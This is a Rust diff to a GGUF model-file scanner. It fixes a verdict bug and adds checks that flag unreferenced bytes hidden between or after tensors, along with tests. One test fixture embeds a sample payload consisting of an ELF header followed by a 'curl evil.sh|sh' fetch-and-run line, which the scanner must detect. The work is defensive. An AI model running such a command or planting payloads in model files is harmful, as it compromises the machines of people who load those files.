@@ -67,13 +67,11 @@ impl<'a> Cur<'a> {
 pub fn analyze(artifact_name: &str, data: &[u8]) -> ArtifactReport {
     let mut report = ArtifactReport::new(artifact_name, "gguf");
     match parse(data, &mut report) {
-        Ok(()) => {
-            if report.verdict != Verdict::Malformed {
-                // Clean unless something downgraded it (e.g. chat template -> still
-                // not "untrusted", just a low finding for review).
-                report.verdict = Verdict::Clean;
-            }
-        }
+        // The report starts clean and `parse` only ever raises the verdict, so
+        // there is nothing to do here. Resetting it to clean used to discard
+        // what the parser had just concluded: an out-of-bounds tensor offset
+        // set `untrusted` and was then reported as CLEAN.
+        Ok(()) => {}
         Err(e) => {
             report.verdict = Verdict::Malformed;
             report.push(Finding::new("GGUF_PARSE_ERROR", Severity::High, e));
@@ -146,10 +144,6 @@ fn parse(data: &[u8], report: &mut ArtifactReport) -> Result<(), String> {
     }
 
     // --- tensor info block ---
-    struct TInfo {
-        name: String,
-        offset: u64,
-    }
     let mut tensors: Vec<TInfo> = Vec::new();
     for _ in 0..tensor_count {
         let name = c.gstring()?;
@@ -157,13 +151,20 @@ fn parse(data: &[u8], report: &mut ArtifactReport) -> Result<(), String> {
         if n_dims > 8 {
             return Err(format!("tensor '{name}' declares {n_dims} dims (>8)"));
         }
+        let mut dims = Vec::with_capacity(n_dims);
         for _ in 0..n_dims {
-            let _dim = c.u64()?;
+            dims.push(c.u64()?);
         }
-        let _ggml_type = c.u32()?;
+        let type_id = c.u32()?;
         let offset = c.u64()?;
-        tensors.push(TInfo { name, offset });
+        tensors.push(TInfo {
+            name,
+            offset,
+            type_id,
+            dims,
+        });
     }
+    let info_end = c.pos as u64;
 
     // No tensors -> nothing more to validate (e.g. a metadata-only file).
     if tensors.is_empty() {
@@ -177,6 +178,7 @@ fn parse(data: &[u8], report: &mut ArtifactReport) -> Result<(), String> {
     }
     let data_segment = data.len() as u64 - data_start;
 
+    let mut any_oob = false;
     for t in &tensors {
         if t.offset > data_segment {
             report.push(
@@ -193,10 +195,245 @@ fn parse(data: &[u8], report: &mut ArtifactReport) -> Result<(), String> {
                 )]),
             );
             report.verdict = Verdict::Untrusted;
+            any_oob = true;
+        }
+    }
+
+    // Byte accounting. Skipped when an offset is already out of bounds: the
+    // file is broken and there is nothing coherent left to account for.
+    if !any_oob {
+        for f in account_for_bytes(data, &tensors, info_end, data_start, alignment) {
+            if f.severity >= Severity::Medium {
+                report.verdict = Verdict::Untrusted;
+            }
+            report.push(f);
         }
     }
 
     Ok(())
+}
+
+struct TInfo {
+    name: String,
+    offset: u64,
+    type_id: u32,
+    dims: Vec<u64>,
+}
+
+impl TInfo {
+    /// Byte length of this tensor's data, when the type layout is known and
+    /// the element count divides into whole blocks.
+    fn byte_len(&self) -> Option<u64> {
+        let (blck, bytes) = crate::dequant::type_layout(self.type_id)?;
+        let numel = self.dims.iter().try_fold(1u64, |a, d| a.checked_mul(*d))?;
+        if blck == 0 || numel % blck != 0 {
+            return None;
+        }
+        (numel / blck).checked_mul(bytes)
+    }
+}
+
+/// At most this many unaccounted regions are listed before the rest are
+/// collapsed into one summary.
+const MAX_REPORTED_REGIONS: usize = 16;
+
+/// Account for every byte of the file.
+///
+/// The header, the KV block and the tensor-info block are consumed by the
+/// parser above. What remains is the alignment padding before the tensor data
+/// and the tensor payloads themselves, so anything else is a byte no reader
+/// will ever look at and no writer had a reason to produce.
+///
+/// Tensor sizes come from the ggml type table, which this function refuses to
+/// trust blindly: if the computed sizes contradict the declared offsets, it
+/// says the accounting is unreliable instead of inventing findings.
+fn account_for_bytes(
+    data: &[u8],
+    tensors: &[TInfo],
+    info_end: u64,
+    data_start: u64,
+    alignment: u64,
+) -> Vec<Finding> {
+    let mut findings = Vec::new();
+    let file_len = data.len() as u64;
+
+    // The padding the writer inserts to align the tensor data.
+    findings.extend(region_finding(
+        data,
+        info_end,
+        data_start.saturating_sub(info_end),
+        alignment,
+        "between the tensor-info block and the tensor data",
+    ));
+
+    let mut sized: Vec<(&TInfo, u64)> = Vec::with_capacity(tensors.len());
+    let mut unsized_types: Vec<&str> = Vec::new();
+    for t in tensors {
+        match t.byte_len() {
+            Some(len) => sized.push((t, len)),
+            None => {
+                let (name, _) = crate::dequant::classify(t.type_id);
+                if !unsized_types.contains(&name) {
+                    unsized_types.push(name);
+                }
+            }
+        }
+    }
+
+    if !unsized_types.is_empty() {
+        findings.push(
+            Finding::new(
+                "GGUF_ACCOUNTING_INCOMPLETE",
+                Severity::Info,
+                format!(
+                    "{} of {} tensors use a type whose storage layout `assay` does not know \
+                     with certainty, so the bytes between tensors are not accounted for",
+                    tensors.len() - sized.len(),
+                    tensors.len()
+                ),
+            )
+            .with_evidence(vec![format!("types: {}", unsized_types.join(", "))]),
+        );
+        return findings;
+    }
+
+    sized.sort_by_key(|(t, _)| t.offset);
+
+    // The type table is cross-checked against the file: overlapping computed
+    // extents mean one of the two is wrong, and we do not assume it is the file.
+    let mut contradictions: Vec<String> = Vec::new();
+    for pair in sized.windows(2) {
+        let (a, a_len) = pair[0];
+        let (b, _) = pair[1];
+        if a.offset + a_len > b.offset {
+            contradictions.push(format!(
+                "'{}' ({} bytes at {}) runs into '{}' at {}",
+                a.name, a_len, a.offset, b.name, b.offset
+            ));
+        }
+    }
+    if let Some((last, last_len)) = sized.last() {
+        if last.offset + last_len > file_len - data_start {
+            contradictions.push(format!(
+                "'{}' ({} bytes at {}) runs past the end of the file",
+                last.name, last_len, last.offset
+            ));
+        }
+    }
+    if !contradictions.is_empty() {
+        let shown: Vec<String> = contradictions.iter().take(3).cloned().collect();
+        findings.push(
+            Finding::new(
+                "GGUF_ACCOUNTING_INCOMPLETE",
+                Severity::Info,
+                format!(
+                    "computed tensor sizes contradict the declared offsets for {} of {} \
+                     tensors, so byte accounting is not reliable for this file and \
+                     unaccounted bytes are not reported",
+                    contradictions.len(),
+                    sized.len()
+                ),
+            )
+            .with_evidence(shown),
+        );
+        return findings;
+    }
+
+    // Walk the data segment, reporting anything no tensor claims.
+    let mut cursor = 0u64; // relative to data_start
+    let mut reported = 0usize;
+    let mut skipped = 0usize;
+    for (t, len) in &sized {
+        if t.offset > cursor {
+            let gap = t.offset - cursor;
+            let f = region_finding(
+                data,
+                data_start + cursor,
+                gap,
+                alignment,
+                &format!("before tensor '{}'", t.name),
+            );
+            if reported < MAX_REPORTED_REGIONS {
+                reported += f.len();
+                findings.extend(f);
+            } else {
+                skipped += f.len();
+            }
+        }
+        cursor = t.offset + len;
+    }
+    let tail = (file_len - data_start).saturating_sub(cursor);
+    if tail > 0 {
+        let f = region_finding(
+            data,
+            data_start + cursor,
+            tail,
+            alignment,
+            "after the last tensor",
+        );
+        if reported < MAX_REPORTED_REGIONS {
+            findings.extend(f);
+        } else {
+            skipped += f.len();
+        }
+    }
+
+    if skipped > 0 {
+        findings.push(Finding::new(
+            "GGUF_UNREFERENCED_BYTES",
+            Severity::High,
+            format!("{skipped} further unaccounted region(s) not listed above"),
+        ));
+    }
+    findings
+}
+
+/// Judge one run of bytes that no tensor claims.
+///
+/// A run shorter than the alignment and filled with zeros is the padding the
+/// format requires, and is not reported. Anything else is a storage channel.
+fn region_finding(
+    data: &[u8],
+    start: u64,
+    len: u64,
+    alignment: u64,
+    placement: &str,
+) -> Vec<Finding> {
+    if len == 0 {
+        return Vec::new();
+    }
+    let end = (start + len).min(data.len() as u64);
+    let region = &data[start as usize..end as usize];
+    let all_zero = region.iter().all(|b| *b == 0);
+
+    if all_zero && len < alignment.max(1) {
+        return Vec::new(); // the alignment padding the format asks for
+    }
+
+    let (severity, what) = match crate::magic::identify(region) {
+        Some(kind) => (
+            Severity::High,
+            format!("and begin with {kind}"),
+        ),
+        None if all_zero => (
+            Severity::Low,
+            format!("and are zero-filled, which is more padding than the {alignment}-byte alignment needs"),
+        ),
+        None => (Severity::Medium, "and are not alignment padding".to_string()),
+    };
+
+    vec![Finding::new(
+        "GGUF_UNREFERENCED_BYTES",
+        severity,
+        format!(
+            "{len} byte(s) {placement} (file offset {start}) belong to no tensor {what}; \
+             no reader looks at them and the manifest hash does not cover them"
+        ),
+    )
+    .with_evidence(vec![
+        format!("file offsets {start}..{end}"),
+        format!("first bytes: {}", crate::magic::preview(region)),
+    ])]
 }
 
 enum ValueScalar {
@@ -450,5 +687,225 @@ mod tests {
     fn bad_magic_is_malformed() {
         let r = analyze("m.gguf", b"NOPExxxxxxxxxxxx");
         assert_eq!(r.verdict, Verdict::Malformed);
+    }
+
+    // -----------------------------------------------------------------
+    // Byte accounting
+    // -----------------------------------------------------------------
+
+    const F32: u32 = 0;
+    const IQ4_XS: u32 = 23; // a type whose layout we deliberately do not know
+
+    /// A complete GGUF file: header, tensor info, alignment padding, data.
+    /// `specs` is (name, ggml type, dims, offset within the data segment).
+    fn gguf(specs: &[(&str, u32, Vec<u64>, u64)], data: &[u8]) -> Vec<u8> {
+        let mut buf = Vec::new();
+        buf.extend_from_slice(b"GGUF");
+        buf.extend_from_slice(&3u32.to_le_bytes());
+        buf.extend_from_slice(&(specs.len() as u64).to_le_bytes());
+        buf.extend_from_slice(&0u64.to_le_bytes()); // no KV pairs
+        for (name, type_id, dims, offset) in specs {
+            buf.extend_from_slice(&(name.len() as u64).to_le_bytes());
+            buf.extend_from_slice(name.as_bytes());
+            buf.extend_from_slice(&(dims.len() as u32).to_le_bytes());
+            for d in dims {
+                buf.extend_from_slice(&d.to_le_bytes());
+            }
+            buf.extend_from_slice(&type_id.to_le_bytes());
+            buf.extend_from_slice(&offset.to_le_bytes());
+        }
+        while buf.len() % 32 != 0 {
+            buf.push(0);
+        }
+        buf.extend_from_slice(data);
+        buf
+    }
+
+    fn ids(r: &ArtifactReport) -> Vec<&str> {
+        r.findings.iter().map(|f| f.id.as_str()).collect()
+    }
+
+    fn unreferenced(r: &ArtifactReport) -> Vec<&Finding> {
+        r.findings
+            .iter()
+            .filter(|f| f.id == "GGUF_UNREFERENCED_BYTES")
+            .collect()
+    }
+
+    /// An out-of-bounds offset used to set `untrusted` inside the parser and
+    /// then be overwritten with `clean` on the way out.
+    #[test]
+    fn an_out_of_bounds_offset_is_not_reported_as_clean() {
+        let r = analyze("m.gguf", &gguf(&[("a", F32, vec![4], 1 << 40)], &[0u8; 32]));
+        assert!(ids(&r).contains(&"GGUF_OFFSET_OOB"), "{:?}", ids(&r));
+        assert_eq!(r.verdict, Verdict::Untrusted);
+    }
+
+    #[test]
+    fn a_chat_template_alone_does_not_condemn_the_file() {
+        let mut bld = Builder::new(3, 0, 1);
+        bld.kv_string("tokenizer.chat_template", "{{ messages }}");
+        let r = analyze("m.gguf", &bld.buf);
+        assert!(ids(&r).contains(&"GGUF_CHAT_TEMPLATE"));
+        assert_eq!(r.verdict, Verdict::Clean, "a template is a review item");
+    }
+
+    #[test]
+    fn a_contiguous_file_accounts_for_every_byte() {
+        // Two 4-element F32 tensors, packed back to back.
+        let r = analyze(
+            "m.gguf",
+            &gguf(
+                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 16)],
+                &[0u8; 32],
+            ),
+        );
+        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
+        assert_eq!(r.verdict, Verdict::Clean);
+    }
+
+    #[test]
+    fn alignment_padding_is_not_a_finding() {
+        // 'b' is aligned to 32, so bytes 16..32 are the padding the format asks
+        // for. Zero-filled and shorter than the alignment: nothing to report.
+        let r = analyze(
+            "m.gguf",
+            &gguf(
+                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 32)],
+                &[0u8; 48],
+            ),
+        );
+        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
+    }
+
+    #[test]
+    fn a_payload_hidden_between_tensors_is_caught() {
+        let mut data = vec![0u8; 16];
+        data.extend_from_slice(b"\x7fELFcurl evil.sh|sh");
+        data.resize(80, 0);
+        data.extend_from_slice(&[0u8; 16]);
+        let r = analyze(
+            "m.gguf",
+            &gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data),
+        );
+
+        let f = unreferenced(&r);
+        assert_eq!(f.len(), 1, "{:?}", ids(&r));
+        assert_eq!(f[0].severity, Severity::High);
+        assert!(f[0].detail.contains("an ELF executable"), "{}", f[0].detail);
+        assert!(f[0].detail.contains("before tensor 'b'"), "{}", f[0].detail);
+        assert_eq!(r.verdict, Verdict::Untrusted);
+    }
+
+    #[test]
+    fn data_after_the_last_tensor_is_caught() {
+        let mut data = vec![0u8; 16];
+        data.extend_from_slice(b"PK\x03\x04");
+        data.extend_from_slice(&[0x41; 200]);
+        let r = analyze("m.gguf", &gguf(&[("a", F32, vec![4], 0)], &data));
+
+        let f = unreferenced(&r);
+        assert_eq!(f.len(), 1, "{:?}", ids(&r));
+        assert_eq!(f[0].severity, Severity::High);
+        assert!(f[0].detail.contains("a ZIP archive"), "{}", f[0].detail);
+        assert!(
+            f[0].detail.contains("after the last tensor"),
+            "{}",
+            f[0].detail
+        );
+    }
+
+    #[test]
+    fn unexplained_bytes_without_a_signature_are_still_reported() {
+        let mut data = vec![0u8; 16];
+        data.extend_from_slice(&[7u8; 64]); // not zeros, not a known format
+        data.extend_from_slice(&[0u8; 16]);
+        let r = analyze(
+            "m.gguf",
+            &gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data),
+        );
+        let f = unreferenced(&r);
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::Medium);
+    }
+
+    #[test]
+    fn zero_padding_larger_than_the_alignment_is_only_noted() {
+        // 256 zero bytes is not alignment padding, but it is not a payload.
+        let r = analyze(
+            "m.gguf",
+            &gguf(
+                &[("a", F32, vec![4], 0), ("b", F32, vec![4], 272)],
+                &[0u8; 288],
+            ),
+        );
+        let f = unreferenced(&r);
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, Severity::Low);
+        assert_eq!(r.verdict, Verdict::Clean, "padding is not a payload");
+    }
+
+    /// The safety valve: an unknown type layout must produce an admission, not
+    /// a pile of invented findings.
+    #[test]
+    fn an_unknown_tensor_type_disables_accounting_instead_of_guessing() {
+        let r = analyze(
+            "m.gguf",
+            &gguf(
+                &[("a", IQ4_XS, vec![256], 0), ("b", F32, vec![4], 4096)],
+                &[0u8; 8192],
+            ),
+        );
+        assert!(unreferenced(&r).is_empty(), "no accusations: {:?}", ids(&r));
+        let note = r
+            .findings
+            .iter()
+            .find(|f| f.id == "GGUF_ACCOUNTING_INCOMPLETE")
+            .expect("an admission");
+        assert_eq!(note.severity, Severity::Info);
+        assert!(note.evidence[0].contains("IQ4_XS"), "{:?}", note.evidence);
+    }
+
+    /// The file cross-checks the type table: if the computed sizes contradict
+    /// the declared offsets, we do not assume the file is the liar.
+    #[test]
+    fn contradictory_sizes_disable_accounting() {
+        // 'a' is 4096 bytes of F32 but 'b' starts 16 bytes in.
+        let r = analyze(
+            "m.gguf",
+            &gguf(
+                &[("a", F32, vec![1024], 0), ("b", F32, vec![4], 16)],
+                &[0u8; 4096],
+            ),
+        );
+        assert!(unreferenced(&r).is_empty(), "{:?}", ids(&r));
+        let note = r
+            .findings
+            .iter()
+            .find(|f| f.id == "GGUF_ACCOUNTING_INCOMPLETE")
+            .expect("an admission");
+        assert!(note.detail.contains("contradict"), "{}", note.detail);
+    }
+
+    #[test]
+    fn the_evidence_locates_the_bytes_in_the_file() {
+        let mut data = vec![0u8; 16];
+        data.extend_from_slice(b"\x7fELFhidden");
+        data.resize(80, 0);
+        data.extend_from_slice(&[0u8; 16]);
+        let buf = gguf(&[("a", F32, vec![4], 0), ("b", F32, vec![4], 80)], &data);
+        let r = analyze("m.gguf", &buf);
+
+        let ev = unreferenced(&r)[0].evidence.join(" ");
+        let start: usize = ev
+            .split("file offsets ")
+            .nth(1)
+            .unwrap()
+            .split("..")
+            .next()
+            .unwrap()
+            .parse()
+            .unwrap();
+        assert_eq!(&buf[start..start + 4], b"\x7fELF");
     }
 }
